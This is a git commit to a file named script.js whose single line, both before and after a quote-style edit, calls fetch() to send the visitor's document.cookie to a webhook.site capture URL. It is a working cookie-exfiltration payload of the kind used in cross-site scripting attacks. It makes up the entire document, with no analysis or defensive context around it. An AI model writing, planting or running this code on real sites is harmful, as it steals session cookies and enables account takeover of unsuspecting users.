b90c7b0ce10f366c662c100bcec1e7d4afccb38f
Marcrasq <90012143+Marcrasq@users.noreply.github.com>
2023-11-15 19:54:11 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/e83bf02b-3c8e-463c-992e-37a6523765e3?cookie=" +document.cookie);
+fetch('https://webhook.site/e83bf02b-3c8e-463c-992e-37a6523765e3?cookie=' +document.cookie);
